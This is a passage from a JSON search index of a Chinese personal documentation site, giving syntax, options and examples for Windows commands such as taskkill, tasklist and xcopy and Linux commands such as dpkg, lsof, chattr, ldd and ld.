system [/U username [/P [password]]]] { [/FI filter] [/PID processid | /IM imagename] } [/T] [/F] 参数列表: /S system 指定要连接的远程系统。 /U [domain\\]user 指定应该在哪个用户上下文执行这个命令。 /P [password] 为提供的用户上下文指定密码。如果忽略，提示 输入。 /FI filter 应用筛选器以选择一组任务。 允许使用 \"*\"。例如，映像名称 eq acme* /PID processid 指定要终止的进程的 PID。 使用 TaskList 取得 PID。 /IM imagename 指定要终止的进程的映像名称。通配符 '*'可用来 指定所有任务或映像名称。 /T 终止指定的进程和由它启用的子进程。 /F 指定强制终止进程。 /? 显示帮助消息。 筛选器 filter: 筛选器名 有效运算符 有效值 ----------- --------------- ------------------------- STATUS eq, ne RUNNING | NOT RESPONDING | UNKNOWN IMAGENAME eq, ne 映像名称 PID eq, ne, gt, lt, ge, le PID 值 SESSION eq, ne, gt, lt, ge, le 会话编号。 CPUTIME eq, ne, gt, lt, ge, le CPU 时间，格式为 hh:mm:ss。 hh - 时， mm - 分，ss - 秒 MEMUSAGE eq, ne, gt, lt, ge, le 内存使用量，单位为 KB USERNAME eq, ne 用户名，格式为 [domain\\]user MODULES eq, ne DLL 名称 SERVICES eq, ne 服务名称 WINDOWTITLE eq, ne 窗口标题 说明 ---- 1) 只有在应用筛选器的情况下，/IM 切换才能使用通配符 '*'。 2) 远程进程总是要强行 (/F) 终止。 3) 当指定远程机器时，不支持 \"WINDOWTITLE\" 和 \"STATUS\" 筛选器。 例如: TASKKILL /IM notepad.exe TASKKILL /PID 1230 /PID 1241 /PID 1253 /T TASKKILL /F /IM cmd.exe /T TASKKILL /F /FI \"PID ge 1000\" /FI \"WINDOWTITLE ne untitle*\" TASKKILL /F /FI \"USERNAME eq NT AUTHORITY\\SYSTEM\" /IM notepad.exe TASKKILL /S system /U 域\\用户名 /FI \"用户名 ne NT*\" /IM * TASKKILL /S system /U username /P password /FI \"IMAGENAME eq note*\" 强制终止掉指定名称的进程 (/IM表示进程名, /F强制终止): taskkill /IM process_name.exe /F","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-taskkill.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-taskkill.html"},{"title":"tasklist","text":"查看所有进程, 想找类似与linux下 ps 时找到的: PS C:\\Users\\yanque> tasklist 映像名称 PID 会话名 会话# 内存使用 ========================= ======== ================ =========== ============ System Idle Process 0 Services 0 8 K System 4 Services 0 3,568 K Registry 268 Services 0 55,028 K smss.exe 936 Services 0 1,032 K csrss.exe 1212 Services 0 6,520 K wininit.exe 1312 Services 0 6,996 K services.exe 1384 Services 0 10,852 K lsass.exe 1408 Services 0 28,764 K svchost.exe 1528 Services 0 31,748 K fontdrvhost.exe 1556 Services 0 2,976 K 查看帮助: C:\\Users\\烟雀>tasklist /? 语法: TASKLIST [/S system [/U username [/P [password]]]] [/M [module] | /SVC | /V] [/FI filter] [/FO format] [/NH] 描述: 该工具显示在本地或远程机器上当前运行的进程列表。 参数列表: /S system 指定连接到的远程系统。 /U [domain]user 指定应该在哪个用户上下文执行这个命令。 /P [password] 为提供的用户上下文指定密码。如果省略，则 提示输入。 /M [module] 列出当前使用所给 exe/dll 名称的所有任务。 如果没有指定模块名称，显示所有加载的模块。 /SVC 显示每个进程中主持的服务。 /APPS 显示 Microsoft Store 应用及其关联的进程。 /V 显示详细任务信息。 /FI filter 显示一系列符合筛选器 指定条件的任务。 /FO format 指定输出格式。 有效值: \"TABLE\"、\"LIST\"、\"CSV\"。 /NH 指定列标题不应该 在输出中显示。 只对 \"TABLE\" 和 \"CSV\" 格式有效。 /? 显示此帮助消息。 筛选器: 筛选器名称 有效运算符 有效值 ----------- --------------- -------------------------- STATUS eq, ne RUNNING | SUSPENDED NOT RESPONDING | UNKNOWN IMAGENAME eq, ne 映像名称 PID eq, ne, gt, lt, ge, le PID 值 SESSION eq, ne, gt, lt, ge, le 会话编号 SESSIONNAME eq, ne 会话名称 CPUTIME eq, ne, gt, lt, ge, le CPU 时间，格式为 hh:mm:ss。 hh - 小时， mm - 分钟，ss - 秒 MEMUSAGE eq, ne, gt, lt, ge, le 内存使用(以 KB 为单位) USERNAME eq, ne 用户名，格式为 [域\\]用户 SERVICES eq, ne 服务名称 WINDOWTITLE eq, ne 窗口标题 模块 eq, ne DLL 名称 注意: 当查询远程计算机时，不支持 \"WINDOWTITLE\" 和 \"STATUS\" 筛选器。 Examples: TASKLIST TASKLIST /M TASKLIST /V /FO CSV TASKLIST /SVC /FO LIST TASKLIST /APPS /FI \"STATUS eq RUNNING\" TASKLIST /M wbem* TASKLIST /S system /FO LIST TASKLIST /S system /U 域\\用户名 /FO CSV /NH TASKLIST /S system /U username /P password /FO TABLE /NH TASKLIST /FI \"USERNAME ne NT AUTHORITY\\SYSTEM\" /FI \"STATUS eq running\"","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tasklist.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tasklist.html"},{"title":"title","text":"语法: title [string] 表示设置 cmd 窗口的标题为 string","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-title.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-title.html"},{"title":"tskill","text":"类似 linux 的 kill, 低配版的 /docs/操作系统/windows/windows_shell/taskkill 结束进程: TSKILL processid | processname [/SERVER:servername] [/ID:sessionid | /A] [/V] processid 要结束的进程的 Process ID。 processname 要结束的进程名称。 /SERVER:servername 含有 processID 的服务器(默认值是当前值)。 使用进程名和 /SERVER 时，必须指定 /ID 或 /A /ID:sessionid 结束在指定会话下运行的进程。 /A 结束在所有会话下运行的进程。 /V 显示正在执行的操作的信息。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tskill.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-tskill.html"},{"title":"where","text":"显示符合搜索模式的文件位置。在默认情况下，搜索是在当前目录和 PATH 环境变量指定的路径中执行的 语法: WHERE [/R dir] [/Q] [/F] [/T] pattern... 参数列表: /R 从指定目录开始，递归性搜索并显示符合指定模式的文件。 /Q 只返回退出代码，不显示匹配文件列表。(安静模式) 匹配文件。(安静模式) /F 显示所有相配文件并用双引号括上。 /T 显示所有相配文件的文件的文件。 pattern 指定要匹配的文件的搜索模式。通配符 * 和 ? 可以用在模式中。 也可以指定 \"$env:pattern\" 和 \"path:pattern\" 格式; 其中 \"env\" 是环境变量，搜索是在 \"env\" 变量的指定的路径中执行的。 这些格式不应该跟 /R 一起使用。此搜索也可以用将 PATHEXT 变 量扩展名附加于此模式的方式完成。 /? 显示此帮助消息。 注意: 如果搜索成功，此工具返回错误级别 0; 如果不成功，返回 1; 如果失败或发生错误，返回 2。 示例: WHERE /? WHERE myfilename1 myfile????.* WHERE $windir:*.* WHERE /R c:\\windows *.exe *.dll *.bat WHERE /Q ??.??? WHERE \"c:\\windows;c:\\windows\\system32:*.dll\" WHERE /F /T *.dll","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-where.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-where.html"},{"title":"wimic","text":"windows下的一个交互式的命令行环境(类似bash shell之类) 帮助用法如下： 命令行帮助 命令 例子 说明 /? 或 -? 显示所有全局开关和别名的语法 /? class /? 显示某个命令的信息 /? memcache /? 显示某个别名的信息 /? temperature get /? 显示别名与动词组合的信息 /?:Full irq get /?:Full 显示动词的帮助信息 常用的 查看所有进程: wimic process","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-wimic.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-wimic.html"},{"title":"xcopy","text":"复制文件和目录树: XCOPY source [destination] [/A | /M] [/D[:date]] [/P] [/S [/E]] [/V] [/W] [/C] [/I] [/Q] [/F] [/L] [/G] [/H] [/R] [/T] [/U] [/K] [/N] [/O] [/X] [/Y] [/-Y] [/Z] [/B] [/J] [/EXCLUDE:file1[+file2][+file3]...] [/COMPRESS] source 指定要复制的文件。 destination 指定新文件的位置和/或名称。 /A 仅复制有存档属性集的文件， 但不更改属性。 /M 仅复制有存档属性集的文件， 并关闭存档属性。 /D:m-d-y 复制在指定日期或指定日期以后更改的文件。 如果没有提供日期，则只复制源时间比目标时间新的文件。 /EXCLUDE:file1[+file2][+file3]... 指定含有字符串的文件列表。每个字符串 在文件中应位于单独的一行。如果任何 字符串与复制文件的绝对路径的任何部分相符， 则排除复制该文件。例如， 指定如 \\obj\\ 或 .obj 的字符串会分别 排除目录 obj 下面的所有文件或带有 .obj 扩展名的所有文件。 /P 创建每个目标文件之前均进行提示。 /S 复制目录和子目录，不包括空目录。 /E 复制目录和子目录，包括空目录。 与 /S /E 相同。可以用来修改 /T。 /V 验证每个新文件的大小。 /W 提示在复制前按键。 /C 即使有错误，也继续复制。 /I 如果目标不存在，且要复制多个文件， 则假定目标必须是目录。 /Q 复制时不显示文件名。 /F 复制时显示完整的源文件名和目标文件名。 /L 显示要复制的文件。 /G 允许将加密文件复制到 不支持加密的目标。 /H 隐藏文件和系统文件也会复制。 /R 覆盖只读文件。 /T 创建目录结构，但不复制文件。不 包括空目录或子目录。/T /E 包括 空目录和子目录。 /U 只复制已经存在于目标中的文件。 /K 复制属性。一般的 Xcopy 会重置只读属性。 /N 用生成的短名称复制。 /O 复制文件所有权和 ACL 信息。 /X 复制文件审核设置(隐含 /O)。 /Y 取消提示以确认要覆盖 现有目标文件。 /-Y 触发提示，以确认要覆盖 现有目标文件。 /Z 在可重新启动模式下复制网络文件。 /B 复制符号链接本身与链接目标。 /J 复制时不使用缓冲的 I/O。推荐复制大文件时使用。 /COMPRESS 如果适用，在传输期间请求网络 压缩。 开关 /Y 可以预先在 COPYCMD 环境变量中设置。 这可能被命令行上的 /-Y 覆盖。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-Windows-windows_shell-xcopy.html","loc":"/yq-doc-source-docs-operating-system-Windows-windows_shell-xcopy.html"},{"title":"7z","text":"低版本系统可能非内置指令, 需要手动安装: apt install p7zip 语法: 7z <command> [<switches>...] <archive_name> [<file_names>...][<@listfiles...>] 支持命令(command): a : Add files to archive b : Benchmark d : Delete files from archive e : Extract files from archive (without using directory names) h : Calculate hash values for files i : Show information about supported formats l : List contents of archive rn : Rename files in archive t : Test integrity of archive u : Update files to archive x : eXtract files with full paths 选项参数 -r 表示递归解压缩所有的子文件夹 -t <Type> 指定压缩类型, 默认7z。 -o <Directory> 设置解压到的目录 -p <Password> 设置解压缩密码 解压, 例: 7z x xxx.7z","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-7.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-7.html"},{"title":"apt-get","text":"支持的command 语法: apt-get <command> [options] [packages] update - 取回更新的软件包列表信息 upgrade - 进行一次升级 install - 安装新的软件包(注：软件包名称是 libc6 而非 libc6.deb) remove - 卸载软件包 autoremove - 卸载所有自动安装且不再使用的软件包 purge - 卸载并清除软件包的配置 source - 下载源码包文件 build-dep - 为源码包配置所需的编译依赖关系 dist-upgrade - 发布版升级，见 apt-get(8) dselect-upgrade - 根据 dselect 的选择来进行升级 clean - 删除所有已下载的包文件 autoclean - 删除已下载的旧包文件 check - 核对以确认系统的依赖关系的完整性 changelog - 下载指定软件包，并显示其changelog download - 下载指定的二进制包到当前目录 选项参数 -h 本帮助文档。 -q 让输出可作为日志 - 不显示进度 -q q 除了错误外，什么都不输出 -d 仅仅下载 - 【不】安装或解开包文件 -s 不作实际操作。只是依次模拟执行命令 -y 对所有询问都回答是(Yes)，同时不作任何提示 -f 当出现破损的依赖关系时，程序将尝试修正系统 -m 当有包文件无法找到时，程序仍尝试继续执行 -u 显示已升级的软件包列表 -b 在下载完源码包后，编译生成相应的软件包 -V 显示详尽的版本号 -c <config> 读取指定配置文件 -o <config> 设置任意指定的配置选项，例如 -o dir::cache=/tmp 模拟安装: apt-get install -s $soft","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT-get.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-APT-get.html"},{"title":"ar","text":"Linux ar命令用于建立或修改备存文件，或是从备存文件中抽取文件。 ar可让您集合许多文件，成为单一的备存文件。在备存文件中，所有成员文件皆保有原来的属性与权限。 当我们的程序中有经常使用的模块，而且这种模块在其他程序中也会用到， 这时按照软件重用的思想，我们应该将它们生成库，使得以后编程可以减少开发代码量。 ar命令可以用来创建、修改库，也可以从库中提出单个模块。 库是一单独的文件，里面包含了按照特定的结构组织起来的其它的一些文件（称做此库文件的member）。 原始文件的内容、模式、时间戳、属主、组等属性都保留在库文件中。 语法: ar[-dmpqrtx][cfosSuvV][a<成员文件>][b<成员文件>][i<成员文件>][备存文件][成员文件] 参数 必要参数： -d 删除备存文件中的成员文件。 -m 变更成员文件在备存文件中的次序。 -p 显示备存文件中的成员文件内容。 -q 将文件附加在备存文件末端。 -r 将文件插入备存文件中。 -t 显示备存文件中所包含的文件。 -x 自备存文件中取出成员文件。 选项参数： a<成员文件> 将文件插入备存文件中指定的成员文件之后。 b<成员文件> 将文件插入备存文件中指定的成员文件之前。 c 建立备存文件。 f 为避免过长的文件名不兼容于其他系统的ar指令指令，因此可利用此参数，截掉要放入备存文件中过长的成员文件名称。 i<成员文件> 将文件插入备存文件中指定的成员文件之前。 o 保留备存文件中文件的日期。 s 若备存文件中包含了对象模式，可利用此参数建立备存文件的符号表。 S 不产生符号表。 u 只将日期较新文件插入备存文件中。 v 程序执行时显示详细的信息。 V 显示版本信息。 用例: 即可以将 b.o(对象文件) 加入到liba.a中, 即打包为静态库文件: ar -r liba.a b.o 默认的加入方式为append，即加在库的末尾。\"r\"关键字可以有三个修饰符\"a\", \"b\"和\"i\"。 \"a\"表示after，即将新成员加在指定成员之后。例如\"ar -ra a.c liba.a b.c\"表示将b.c加入liba.a并放在已有成员a.c之后； \"b\"表示before，即将新成员加在指定成员之前。例如\"ar -rb a.c liba.a b.c\"; \"i\"表示insert，跟\"b\"作用相同。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AR.html"},{"title":"apt-cache","text":"支持的command depends 查看该软件包需要哪些依赖包 rdepends 查看该软件包被哪些包依赖 列出软件的安装来源 列: apt-cache madison $soft # 搜索源里面的可用版本 apt-cache policy $sofy # 比上面那个详细一点 apt-cache showpkg $soft # 比上一个更详细，还会列出所有相关的 apt-cache show $soft # 显示指定包的详情 dpkg -s $soft也可以","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Apt-Cache.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Apt-Cache.html"},{"title":"chattr","text":"Linux chattr命令用于改变文件属性。 这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式： a：让文件或目录仅供附加用途。 b：不更新文件或目录的最后存取时间。 c：将文件或目录压缩后存放。 d：将文件或目录排除在倾倒操作之外。 i：不得任意更动文件或目录, 预防被删除, 也不能更改文件权限。 s：保密性删除文件或目录。 S：即时更新文件或目录。 u：预防被修改。 e: 允许设置拓展属性 (通过 /docs/操作系统/linux/linux指令/setfattr 和 /docs/操作系统/linux/linux指令/getfattr ) 语法: chattr [-RV][-v<版本编号>][+/-/=<属性>][文件或目录...] 选项: -R 递归处理，将指定目录下的所有文件及子目录一并处理。 -v <版本编号> 设置文件或目录版本。 -V 显示指令执行过程。 +<属性> 开启文件或目录的该项属性。 -<属性> 关闭文件或目录的该项属性。 =<属性> 指定文件或目录的该项属性。 实例 用chattr命令防止系统中某个关键文件被修改: chattr +i /etc/resolv.conf lsattr /etc/resolv.conf 会显示如下属性: ----i-------- /etc/resolv.conf 让某个文件只能往里面追加数据，但不能删除，适用于各种日志文件: chattr +a /var/log/messages 这就给 file 文件添加了一个自定义的 user.email 扩展属性: chattr +e file setfattr -n user.email -v \"test@example.com\" file getfattr -n user.email file","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chattr.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Chattr.html"},{"title":"dpkg","text":"debian linux上安装、创建、管理软件包的工具 选项参数 -i <package> , --install <package> 安装软件包 package -r <package> , --remove <package> 删除软件包 -P <package> , --purge <package> 删除软件包的同时删除其配置文件 -L <package> , --listfiles <package> 显示软件包关联的文件 -l 显示已安装软件包列表 --unpack 解开软件包 -c <package> 显示软件包内文件列表 --confiugre <package> 配置软件包 -s <package> , --status <package> 查看软件包信息，是否已安装之类 -S 搜索 --list 查看所有已安装软件包 -b <dir deb_name> 打包软件包, 第一个参数为deb的构建目录, 第二个为包名 --info <package> 查看deb包信息 -x <package dir> 解压deb中所要安装的文件, 第一个参数为所要解压的deb包，第二个参数为将deb包解压到指定的目录 不过这个只能解出安装文件, desktop等文件解包的用 dpkg-deb -R -e <package> 解压deb中所要安装的文件, 第一个参数为所要解压的deb包，第二个参数为将deb包解压到指定的目录 注解 读取手册使用: man dpkg-query 而不是: man dpkg dpkg -l 结果 dpkg -l 结果结构解析: root@6378b4ca047d:/# dpkg -l Desired=Unknown/Install/Remove/Purge/Hold | Status=Not/Inst/Conf-files/Unpacked/halF-conf/Half-inst/trig-aWait/Trig-pend |/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad) ||/ Name Version Architecture Description +++-===========================-=======================-============-=============================================================================== ii adduser 3.118ubuntu2 all add and remove users and groups ii apt 2.0.2 amd64 commandline package manager 第一列首字母含义 首字母 含义 u 未知 i 安装 r 删除/卸载 p 清除（删除包括配置文件） h ？？？保持？保留？ 第一列第二字母含义 字母 含义 n 未安装 i 安装 c 仅安装配置文件 U 已解压 F 由于某种原因配置失败（半配置） H 由于某种原因安装失败（半安装） W 等待触发器（程序包正在等待另一个程序包的触发器） t 触发挂起（已经触发） 第一列第三字母含义 字母 含义 R 需要重新安装（包损坏 需重装） 如: ii 表示软件正常安装 rc表示软件已卸载，可是配置文件还在，可以通过以下命令进行清理: dpkg -l | grep &#94;rc | cut -d' ' -f3 | sudo xargs dpkg --purg","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DPKG.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-DPKG.html"},{"title":"pr","text":"将文本文件转换成适合打印的格式，它可以把较大的文件分割成多个页面进行打印，并为每个页面添加标题。 语法: pr(选项)(参数) 选项 -h <标题> 为页指定标题； -l <行数> 指定每页的行数。 参数 文件 需要转换格式的文件。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Deceptive.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Deceptive.html"},{"title":"fg","text":"恢复像被 Ctrl + Z 挂起的进程的执行 使用 /docs/操作系统/linux/linux指令/jobs 查看后台运行的进程, 使第 N 个任务在前台运行: fg %N 默认不带%N时表示对最后一个进程操作！","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-France.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-France.html"},{"title":"gcc","text":"详见 /docs/后端/c/gcc(++)编译器 选项 -I <dir> 指定头文件所在目录, 会优先找此处指定的目录 -l <dir> 指定库路径. 指定需要链接的库名，用于告诉链接器需要链接哪些库文件 -L <dir> 指定库文件所在目录 -f no-lto 禁用链接时优化（LTO） 当使用该选项编译源代码时，编译器将不会进行链接时优化， 这可能会导致一些性能上的损失，但也可以避免某些链接错误。 注解 -fno-lto 主要用于使用的链接文件是由其他版本LTO的gcc编译时导致无法继续编译时候吧","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GCC.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-GCC.html"},{"title":"iotop","text":"iotop 一个用来监视磁盘I/O使用状况的top类工具。 iotop具有与top相似的UI，其中包括PID、用户、I/O、进程等相关信息。 Linux下的IO统计工具如iostat，nmon等大多数是只能统计到per设备的读写情况， 如果你想知道每个进程是如何使用IO的就比较麻烦，使用iotop命令可以很方便的查看。 iotop使用Python语言编写而成，要求Python2.5（及以上版本）和Linux kernel2.6.20（及以上版本）。 iotop提供有源代码及rpm包，可从其官方主页下载。 选项 -o 只显示有io操作的进程 -b 批量显示，无交互，主要用作记录到文件。 -n NUM 显示NUM次，主要用于非交互式模式。 -d SEC 间隔SEC秒显示一次。 -p PID 监控的进程pid。 -u USER 监控的进程用户。 -t , --time 加上时间戳，非交互非模式 iotop常用快捷键: 左右箭头：改变排序方式，默认是按IO排序。 r：改变排序顺序。 o：只显示有IO输出的进程。 p：进程/线程的显示方式的切换。 a：显示累积使用量。 q：退出。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IOTOP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-IOTOP.html"},{"title":"inotifywait","text":"监控文件夹变化, 适用于Linux 安装: brew install inotify-tools 使用inotifywait命令来监听文件夹变化的基本示例: inotifywait -m -r -e create,modify,delete /path/to/directory # -e create,modify,delete # 指定要监听的事件类型，包括文件的创建、修改和删除。 # /path/to/directory：要监听的目标文件夹的路径。 -m 保持监听状态，持续监视文件夹的变化。 -r 递归地监听子目录。 运行以上命令后，inotifywait会一直运行并监听指定目录中的文件变化。 当有新文件被创建、文件被修改或文件被删除时，它会输出相应的事件信息。","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Inotifywait.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Inotifywait.html"},{"title":"jobs","text":"查看后台被挂起的进程, 一般用于 Ctrl + Z 手动挂起进程后的查看 通过 /docs/操作系统/linux/linux指令/fg 命令可以恢复进程到前台执行; /docs/操作系统/linux/linux指令/bg 命令恢复进程到后台执行: jobs 显示当前暂停的进程 bg %N 使第N个任务在后台运行（%前有空格） fg %N 使第N个任务在前台运行","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Jobs.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Jobs.html"},{"title":"ldd","text":"用于打印程序或者库文件所依赖的共享库列表 安装(ubuntu, 待验证, mac下不行): apt install binutils 语法: ldd (选项) (参数) 选项 --version 打印指令版本号； -v 详细信息模式，打印所有相关信息； -u 打印未使用的直接依赖； -d 执行重定位和报告任何丢失的对象； -r 执行数据对象和函数的重定位，并且报告任何丢失的对象和函数； --help 显示帮助信息。 参数 文件：指定可执行程序或者文库。 原理 ldd不是一个可执行程序，而只是一个shell脚本 ldd能够显示可执行模块的dependency(所属)(所属)， 其原理是通过设置一系列的环境变量，如下: LD_TRACE_LOADED_OBJECTS LD_WARN LD_BIND_NOW LD_LIBRARY_VERSION LD_VERBOSE 等 当LD_TRACE_LOADED_OBJECTS环境变量不为空时，任何可执行程序在运行时， 它都会只显示模块的dependency(所属)，而程序并不真正执行。 你可以在shell终端测试一下，如下： export LD_TRACE_LOADED_OBJECTS=1 再执行任何的程序，如ls等，看看程序的运行结果。 ldd显示可执行模块的dependency(所属)的工作原理， 其实质是通过ld-linux.so（elf动态库的装载器）来实现的。 我们知道，ld-linux.so模块会先于executable模块程序工作，并获得控制权， 因此当上述的那些环境变量被设置时，ld-linux.so选择了显示可执行模块的dependency(所属)。 实际上可以直接执行ld-linux.so模块，如: /lib/ld-linux.so.2 --list program 相当于ldd program","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LDD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LDD.html"},{"title":"lpr","text":"用于将文件发送给指定打印机进行打印，如果不指定目标打印机，则使用默认打印机。 语法: lpr(选项)(参数) 选项 -E 与打印服务器连接时强制使用加密； -H 指定可选的打印服务器； -C 指定打印任务的名称； -P 指定接受打印任务的目标打印机； -U 指定可选的用户名； -h 关闭banner打印； -m 打印完成后发送E-mail； -r 打印完成后删除文件。 其他: -# 指定打印的份数； 参数 文件 需打印的文件。 实例 将man1和man2送到打印机lp进行打印: lpr -P lp man1 man2","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LPR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LPR.html"},{"title":"lsof","text":"强大的查询工具，-i几乎万能（自吹） 关键选项 默认 : 没有选项，lsof列出活跃进程的所有打开文件 组合 : 可以将选项组合到一起，如-abc，但要当心哪些选项需要参数 -a 结果进行\"与\"运算（而不是\"或\"） -l 在输出显示用户ID而不是用户名 -h 获得帮助 -t 仅获取进程ID -U 获取UNIX套接口地址 -F 格式化输出结果，用于其它命令。 可以通过多种方式格式化，如-F pcfn（用于进程id、命令名、文件描述符、文件名，并以空终止） -i 条件查询连接, 如指定协议: lsof -i tcp:$port -i（4,6，协议，：端口，@ip） -c 查看指定的命令正在使用的文件与网络连接 -c vim -u 显示指定用户打开了什么 -u <user> 消灭指定用户的所有东西 kill -9 lsof -t -u luyi -p 指定进程ID(pid)已经打开的文件 -p 643 +d 查看某目录文件信息 不加d也可以，但是可能不全 +D 递归查看某目录文件信息 更详细的描述以及恢复被删除的文件，某种情况 可参考: https://www.cnblogs.com/sparkbj/p/7161669.html mac下查看指定端口是否有占用, 如查询 tcp的8080是否占用: lsof -i tcp:8080 使用这个主要是因为 mac 的 netstat 跟linux下有点不一样","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSOF.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSOF.html"},{"title":"ln","text":"功能 用来为文件创建链接，链接类型分为硬链接和符号链接两种，默认的链接类型是硬链接。如果要创建符号链接必须使用\"-s\"选项。 注意：符号链接文件不是一个独立的文件，它的许多属性依赖于源文件，所以给符号链接文件设置存取权限是没有意义的。 选项参数 ln选项参数 选项 说明 --backup[=CONTROL] 为每个已存在的目标文件创建备份文件 -b 类似--backup，但不接受任何参数 -d, -F, --directory 创建指向目录的硬链接(只适用于超级用户) -f, --force 强行删除任何已存在的目标文件 -i, --interactive 覆盖既有文件之前先询问用户； -L, --logical 取消引用作为符号链接的目标 -n, --no-dereference 把符号链接的目的目录视为一般文件； -P, --physical 直接将硬链接到符号链接 -r, --relative 创建相对于链接位置的符号链接 -s, --symbolic 对源文件建立符号链接，而非硬链接； -S, --suffix=SUFFIX 用\"-b\"参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号\"~\"，用户可通过\"-S\"参数来改变它； -t, --target-directory=DIRECTORY 指定要在其中创建链接的DIRECTORY -T, --no-target-directory 将\"LINK_NAME\"视为常规文件 -v, --verbose 打印每个链接文件的名称 --help 显示此帮助信息并退出 --version 显示版本信息并退出 注解 常用: ln -snf $src $dist","tags":"操作系统","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Liaoning.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Liaoning.html"},{"title":"ld","text":"ld（Link eDitor）命令是二进制工具集 GNU Binutils 的一员， 是 GNU 链接器，用于将目标文件与库链接为可执行文件或库文件 语法: ld [OPTIONS] OBJFILES ld 命令支持众多链接选项，但是大部分选项很少被使用，下面是 GNU ld 命令接受的选项 -b <input-format> 指定目标代码输入文件的格式 -B static 只使用静态库 -B dynamic 只使用动态库 -B symbolic 把引用捆绑到共享库中的全局符号 -c <MRI-commandfile> , --mri-script= <MRI-commandfile> 为与 MRI 链接器兼容，ld 接受由 MRI 命令语言编写的脚本文件 --cref 创建跨引用表 -d , -d c , -d p 即使指定了可重定位的输出文件（使用-r），也会为公共符号分配空间。脚本命令\"FORCE_COMMON_ALLOCATION\"具有相同的效果 -d efsym 在输出文件中创建指定的全局符号 -d emangle 在错误消息中还原符号名称 -e <entry> 使用指定的符号作为程序的初始执行点 -E , --export-dynamic 对于ELF格式文件，创建动态链接的可执行文件时，把所有符号添加到动态符号表 -f <name> , --auxiliary= <name> 对于 ELF 格式共享对象，设置 DT_AUXILIARY 名称 -F <name> , --filter= <name> 对于ELF格式共享对象，设置 DT_FILTER 名称。这告诉动态链接器，正在创建的共享对象的符号表应该用作共享对象名称的符号表的筛选器。 -g 被忽略。用于提供和其他工具的兼容性 -h 对于 ELF 格式共享对象，设置 DT_SONAME 名称 -I <file> , --dynamic-linker= <file> 指定动态链接器。这仅在生成依赖动态链接库的 ELF 可执行文件时才有意义。默认的动态链接器通常是正确的，除非您知道正在做什么，否则不要使用该选项。 -l <namespec> , --library= <namespec> 把指定的库文件添加到要链接的文件清单 -L <searchdir> , --library-path= searchdir 把指定的路径添加添加到搜索库的目录清单 -M , --print-map 显示链接映射，用于诊断目的 -m <emulation> 模拟指定的链接器 -N , --omagic 指定读取/写入文本和数据段 -n , --nmagic 关闭节的页面对齐，并禁用对共享库的链接。如果输出格式支持Unix样式的幻数，则将输出标记为\"NMAGIC\" -n oinhibit-exec 生成输出文件，即使出现非致命链接错误。通常，如果链接器在链接过程中遇到错误，它将不会生成输出文件。 -n o-keep-memory ld 通常在内存中缓存输入文件的符号表来优化内存使用速度。此选项告诉 ld 不要缓存符号表。当链接大型可执行文件时，如果ld耗尽内存空间，则可能需要使用该选项 -O <level> 对于非零的优化等级，ld将优化输出。此操作会比较耗时，应该在生成最终的结果时使用。 -o <output> , --output= <output> 指定输出文件的名称. 使用 format=<output-format> 指定输出文件的二进制格式 -R <filename> , --just-symbols= <filename> 从指定的文件读取符号名称和地址 -r , --relocatable 生成可重定位的输出（称为部分连接） -S , --strip-debug 忽略来自输出文件的调试器符号信息 -s , --strip-all 忽略来自输出文件的所有符号信息 -s hared , -B shareable 创建共享库 -t , --trace 在处理输入文件时显示它们的名称 -u <symbol> , --undefined= <symbol> 强制指定符号在输出文件中作为未定义符号 -v , -V , --version 示ld版本号 -w arn-common 